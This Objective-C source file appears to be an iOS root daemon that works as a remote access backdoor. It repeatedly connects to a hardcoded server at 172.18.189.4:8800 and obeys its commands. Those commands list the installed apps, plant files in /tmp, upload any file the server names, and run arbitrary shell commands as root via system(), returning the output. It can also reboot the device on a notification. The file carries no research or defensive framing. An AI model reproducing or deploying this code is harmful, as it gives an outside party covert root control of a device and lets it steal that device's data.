#include <sys/stat.h>
#import <arpa/inet.h>
#import <netdb.h>
#import "Reachability.h"

static void Reboot(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo)
{
        NSLog(@"Cuit: reboot");
        system("reboot");
}
struct file_info
{
    char filename[100];
    int filesize;
};
#define CHUNK_SIZE 512
#define MSG_SendAgain 0x55
#define MSG_SendOver 0x66

#define serverHost @"http://172.18.189.4" //@"telnet://towel.blinkenlights.nl"
#define serverPort @"8800"                  //23


int global_flag = 1;

@interface MyClass :NSObject
@end

@implementation MyClass


-(void) myThredaMethod:(NSURL *)url
{
    @autoreleasepool {
        NSString * host = [url host];//@"10.17.4.178";//;
        NSNumber * port = [url port];//[NSNumber numberWithInt:8800];//;
        

        // Create socket
        //
        int socketFileDescriptor = socket(AF_INET, SOCK_STREAM, 0);
        if (-1 == socketFileDescriptor) {
            NSLog(@"Failed to create socket.");
        close(socketFileDescriptor);
        global_flag = 0;
        return;
        }
        
        // Get IP address from host
        //
        struct hostent * remoteHostEnt = gethostbyname([host UTF8String]);
        if (NULL == remoteHostEnt) {
            close(socketFileDescriptor);
        global_flag = 0;
        return;
        }
        
        struct in_addr * remoteInAddr = (struct in_addr *)remoteHostEnt->h_addr_list[0];
        
        // Set the socket parameters
        //
        struct sockaddr_in socketParameters;
        socketParameters.sin_family = AF_INET;
        socketParameters.sin_addr = *remoteInAddr;
        socketParameters.sin_port = htons([port intValue]);
        bzero(&(socketParameters.sin_zero), 8);
        
        
        //    //在connect之前，设成非阻塞模式
        //    int flags = fcntl(socketFileDescriptor, F_GETFL,0);
        //        fcntl(socketFileDescriptor,F_SETFL, flags | O_NONBLOCK);
        
        /***************************************************/
        //设成阻塞模式
        //    int flags = fcntl(socketFileDescriptor, F_GETFL,0);
        //    flags &= O_NONBLOCK;
        //    fcntl(socketFileDescriptor,F_SETFL, flags);
        
        // Connect the socket
        //
        int ret = connect(socketFileDescriptor, (struct sockaddr *) &socketParameters, sizeof(struct sockaddr));
            if (-1 == ret) {
                close(socketFileDescriptor);
        global_flag = 0;
        return;
            }
        
        NSLog(@" >> Successfully connected to %@:%@", host, port);
        
        /***************************************************/
        //设置不被SIGPIPE信号中断，物理链路损坏时才不会导致程序直接被Terminate
        //在网络异常的时候如果程序收到SIGPIRE是会直接被退出的。
        struct sigaction sa;
        sa.sa_handler = SIG_IGN;
        sigaction( SIGPIPE, &sa, 0 );
        /***************************************************/
        
        while(1)
        {
            char buffer[100];
            memset(buffer, 0, sizeof(buffer));
            int count;
            count = 0;
            int result = recv(socketFileDescriptor, buffer, 100, 0);
            while (result == -1 || result == 0) {
                result = recv(socketFileDescriptor, buffer, 100, 0);
                ////sleep(0.5);
                count++;
                if (count == 50) {
                    close(socketFileDescriptor);
        global_flag = 0;
        return;
                }
            }
            
            if (strcmp(buffer, "quit") == 0) {
                    NSLog(@"quit~_~ break");
                    close(socketFileDescriptor);
            global_flag = 0;
            return;
            }
            else if (strcmp(buffer, "ListApp") ==0) {
                Class LSApplicationWorkspace_class = [NSClassFromString(@"LSApplicationWorkspace") performSelector:@selector(defaultWorkspace)];
                NSLog(@"LSApplicationWorkspace_class = %@",LSApplicationWorkspace_class);

                NSArray* AllAPP = [LSApplicationWorkspace_class performSelector:@selector(allInstalledApplications)];
                NSLog(@"AllAPP = %@",AllAPP);
                NSString * AllAPPStr = [AllAPP description];
                NSLog(@"AllAPPStr = %@",AllAPPStr);
                int CommandSize = [AllAPPStr length];
                
                
                send(socketFileDescriptor, (char*)&CommandSize, sizeof(CommandSize), 0);
                
                int nChunkCount = 0;
                nChunkCount = CommandSize / CHUNK_SIZE;
                if (CommandSize % CHUNK_SIZE != 0) {
                    nChunkCount++;
                }
                char ok[3];
                ok[2]='\0';
                recv(socketFileDescriptor, ok, 2, 0);
                
                while (strcmp(ok, "") == 0) {
                    result = recv(socketFileDescriptor, ok, 2, 0);
                    ////sleep(0.5);
                }
                
                if (strcmp(ok, "ok") == 0){
                    printf("start to send\n");
                    char FileData[CHUNK_SIZE];
                    memset(FileData, 0, CHUNK_SIZE);
                    int nCount = 0;NSRange range ;
                    for (int i=0; i<nChunkCount; i++) {
                        int nLeft;
                        if (i+1 == nChunkCount) {
                            nLeft = CommandSize - (nChunkCount -1)*CHUNK_SIZE;
                            strncpy(FileData, (char*)[[AllAPPStr substringFromIndex: nCount] UTF8String],nLeft);
                        }
                        else
                        {
                            nLeft = CHUNK_SIZE;
                            range = NSMakeRange(nCount, nLeft);
                            strncpy(FileData, (char*)[[AllAPPStr substringWithRange: range] UTF8String],nLeft);
                        }
                        int idx =0;
                        
                        nCount+=nLeft;
                        while (nLeft > 0) {
                            int iRet = send(socketFileDescriptor, &FileData[idx], nLeft, 0);
                            //printf("第 %d 个包 大小:%d\n",i+1,iRet);
                            nLeft -= iRet;
                            idx += iRet;
                        }
                    }
                }
            }
            else if (strcmp(buffer, "sendfile") ==0) {
                printf("try to recv filename\n");
                struct file_info my_file;
                memset(&my_file, 0, sizeof(my_file));
                
                result =recv(socketFileDescriptor, (char*)&my_file, sizeof(my_file), 0);
                
                while (strcmp(my_file.filename, "") == 0) {
                    result = recv(socketFileDescriptor, (char*)&my_file, sizeof(my_file), 0);
                    //sleep(0.5);
                }
                
                int nChunkCount = 0;
                nChunkCount = my_file.filesize / CHUNK_SIZE;
                if (my_file.filesize %CHUNK_SIZE !=0) {
                    nChunkCount++;
                }
                
                printf("recv the filename : %s\nget ready to recv the file\n",my_file.filename);
                char filepath[60];
                strcpy(filepath, "/tmp/");
                strcat(filepath, my_file.filename);
                
                seteuid(0);
                int filefd = open(filepath, O_CREAT|O_RDWR);
                if (filefd<0) {
                    printf("file open error try to remove the file %s",filepath);
                    char command[70];
                    memset(command, 0, sizeof(command));
                    strcpy(command, "rm ");
                    strcat(command,filepath);
                    system(command);
                    filefd = open(filepath, O_CREAT|O_RDWR);
                }
                char ok[3];
                strcpy(ok, "ok");
                ok[2] = '\0';
                if (send(socketFileDescriptor, ok, 2, 0)) {//发送给服务端开始发送文件数据
                    char FileData[CHUNK_SIZE];
                    memset(FileData, 0, CHUNK_SIZE);
                    for (int i=0; i<nChunkCount; i++) {
                        int nLeft;
                        if (i+1 == nChunkCount) {
                            nLeft = my_file.filesize - (nChunkCount-1)*CHUNK_SIZE;
                        }
                        else
                        {
                            nLeft = CHUNK_SIZE;
                        }
                        int idx = 0;
                        int nCount = 0;
                        while (nLeft >0) {
                            int iRet = recv(socketFileDescriptor, &FileData[idx],  nLeft, 0);
                            if (-1 == iRet) {
                                printf("recv error");
                                close(socketFileDescriptor);
        global_flag = 0;
        return;
                            }
                            nCount += iRet;
                            idx += iRet;
                            nLeft -= iRet;
                        }
                        write(filefd, FileData,nCount);
                    }
                }
                printf("\nwrite file over\n");
                close(filefd);
                seteuid(0);
            }
            else if (strcmp(buffer, "downloadfile") ==0) {
                printf("try to recv  downloadpathnamefile\n");
                struct file_info my_file;
                memset(&my_file, 0, sizeof(my_file));
                
                result =recv(socketFileDescriptor, (char*)&my_file, sizeof(my_file), 0);
                
                while (strcmp(my_file.filename, "") == 0) {
                    result = recv(socketFileDescriptor, (char*)&my_file, sizeof(my_file), 0);
                    //sleep(0.5);
                }
                
                printf("recv the downloadpathnamefile : %s\nget ready to send the file\n",my_file.filename);
                
                seteuid(0);
                int filefd = open(my_file.filename, O_RDONLY);
                if (filefd<0)
                {
                    printf("file open error");
                    my_file.filesize = 0;
                    send(socketFileDescriptor, (char*)&my_file, sizeof(my_file), 0);
                    continue;
                }
                struct stat my_file_stat;
                fstat(filefd,&my_file_stat);
                my_file.filesize = my_file_stat.st_size;
                
                send(socketFileDescriptor, (char*)&my_file, sizeof(my_file), 0);
                
                int nChunkCount = 0;
                nChunkCount = my_file.filesize / CHUNK_SIZE;
                if (my_file.filesize %CHUNK_SIZE != 0) {
                    nChunkCount++;
                }
                char ok[3];
                ok[2]='\0';
                recv(socketFileDescriptor, ok, 2, 0);
                
                while (strcmp(ok, "") == 0) {
                    result = recv(socketFileDescriptor, ok, 2, 0);
                    //sleep(0.5);
                }
                
                if (strcmp(ok, "ok") == 0){
                    printf("start to send\n");
                    char FileData[CHUNK_SIZE];
                    memset(FileData, 0, CHUNK_SIZE);
                    for (int i=0; i<nChunkCount; i++) {
                        int nLeft;
                        if (i+1 == nChunkCount) {
                            nLeft = my_file.filesize - (nChunkCount -1)*CHUNK_SIZE;
                        }
                        else
                        {
                            nLeft = CHUNK_SIZE;
                        }
                        int idx =0;
                        read(filefd, FileData, CHUNK_SIZE);
                        while (nLeft > 0) {
                            int iRet = send(socketFileDescriptor, &FileData[idx], nLeft, 0);
                            //printf("第 %d 个包 大小:%d\n",i+1,iRet);
                            nLeft -= iRet;
                            idx += iRet;
                        }
                    }
                }
                printf("downloadfile send file over\n");
                close(filefd);
                seteuid(0);
                
            }
            
            else if (strcmp(buffer, "command") ==0)
            {
                //sleep(1);
                memset(buffer, 0, sizeof(buffer));
                int result = recv(socketFileDescriptor, buffer, 100, 0);
                while (strcmp(buffer, "") == 0) {
                    result = recv(socketFileDescriptor, buffer, 100, 0);
                    //sleep(0.5);
                }
                printf("\nsend message to %s\nmessage: \n",inet_ntoa(socketParameters.sin_addr));
                
                seteuid(0);
                strcat(buffer, " > /tmp/command.txt");
                system(buffer);
                
                NSString *CmdStr = [NSString stringWithContentsOfFile:@"/tmp/command.txt" encoding:NSUTF8StringEncoding error:nil];
                
                int CommandSize = [CmdStr length];
                
                send(socketFileDescriptor, (char*)&CommandSize, sizeof(CommandSize), 0);
                
                int nChunkCount = 0;
                nChunkCount = CommandSize / CHUNK_SIZE;
                if (CommandSize % CHUNK_SIZE != 0) {
                    nChunkCount++;
                }
                char ok[3];
                ok[2]='\0';
                recv(socketFileDescriptor, ok, 2, 0);
                
                while (strcmp(ok, "") == 0) {
                    result = recv(socketFileDescriptor, ok, 2, 0);
                    //sleep(0.5);
                }
                
                if (strcmp(ok, "ok") == 0){
                    printf("start to send\n");
                    char FileData[CHUNK_SIZE];
                    memset(FileData, 0, CHUNK_SIZE);
                    int nCount = 0;NSRange range ;
                    for (int i=0; i<nChunkCount; i++) {
                        int nLeft;
                        if (i+1 == nChunkCount) {
                            nLeft = CommandSize - (nChunkCount -1)*CHUNK_SIZE;
                            strncpy(FileData, (char*)[[CmdStr substringFromIndex: nCount] UTF8String],nLeft);
                        }
                        else
                        {
                            nLeft = CHUNK_SIZE;
                            range = NSMakeRange(nCount, nLeft);
                            strncpy(FileData, (char*)[[CmdStr substringWithRange: range] UTF8String],nLeft);
                        }
                        int idx =0;
                        
                        nCount+=nLeft;
                        while (nLeft > 0) {
                            int iRet = send(socketFileDescriptor, &FileData[idx], nLeft, 0);
                            //printf("第 %d 个包 大小:%d\n",i+1,iRet);
                            nLeft -= iRet;
                            idx += iRet;
                        }
                    }
                }
                
                strcpy(buffer, "rm /tmp/command.txt");
                system(buffer);
                seteuid(0);
                //method 2
                /*
                 FILE   *stream;
                 stream = popen(buffer, "r" ); //将“ls －l”命令的输出 通过管道读取（“r”参数）到FILE* stream
                 fread( data.buf, sizeof(char), 4096, stream); //将刚刚FILE* stream的数据流读取到buf中
                 
                 if (strlen(data.buf)*sizeof(char) >= 4096) {
                 data.flag = MSG_SendAgain;
                 result = send(socketFileDescriptor, (char*)&data,sizeof(data), 0);
                 while (data.flag == MSG_SendAgain) {
                 memset(data.buf, 0, 4096);
                 if (fread( data.buf, sizeof(char), 4096, stream) <= 0) {
                 data.flag = MSG_SendOver;
                 }
                 result = send(socketFileDescriptor, (char*)&data,sizeof(data), 0);
                 }
                 }
                 else{
                 result = send(socketFileDescriptor, (char*)&data,sizeof(data), 0);
                 printf("message: \n%s",data.buf);
                 }
                 pclose( stream );
                 */
            }
            else
                NSLog(@"Received message:%s\nI don't know what is it.",buffer);
            
        }
    }
}

-(void)CFRunLoopRun
{
     NSLog(@"ready to connect");
     printf("ready to connect\n");
     int nCount = 0;
     NSURL * url = [NSURL URLWithString:[NSString stringWithFormat:@"%@:%@", serverHost, serverPort]];
    
    NSString * host = [url host];
    while (1) {
        while (![self isConnectNetworkandwarnning:host])
        {
            sleep(3);
        }
        NSThread * myThread =[[NSThread alloc] initWithTarget:self selector:@selector(myThredaMethod:) object:url];
        
        [myThread start];
        NSLog(@"connect %d times",nCount);
        printf("connect %d times",nCount);
        while (global_flag) {
            sleep(5);
        }
        nCount++;
        if (nCount == 10) {
            sleep(10);
            nCount = 0;
        }
    }
}
-(BOOL)isConnectNetworkandwarnning:(NSString *) host
{
    Reachability *r = [Reachability reachabilityWithHostName:host];
    switch ([r currentReachabilityStatus]) {
        case NotReachable:// 没有网络连接
        {
         NSLog(@"nonetwork");
            return NO;
            break;
        }
        case ReachableViaWWAN:// 使用3G网络
        {
            NSLog(@"3g");
            return YES;
            break;
        }
        case ReachableViaWiFi:// 使用WiFi网络
        {
            NSLog(@"wifi");
            return YES;
            break;
        }
    }
    return YES;
}

@end

int main(int argc, char **argv, char **envp)
{
	NSLog(@"Cuit: rootdaemonserver is launched");

	CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), NULL, Reboot,
                                    CFSTR("com.cuit.rootdaemonserver.reboot"),
                                    NULL,//If NULL, callback is called when a notification named name is posted by any object.
                                    CFNotificationSuspensionBehaviorCoalesce);
    NSLog(@"ready to call CFRunLoopRun");
    MyClass * myclass = [[MyClass alloc] init];
    [myclass CFRunLoopRun];
        //CFRunLoopRun(); // keep it running in background
	 NSLog(@"Cuit:  end");
	return 0;
}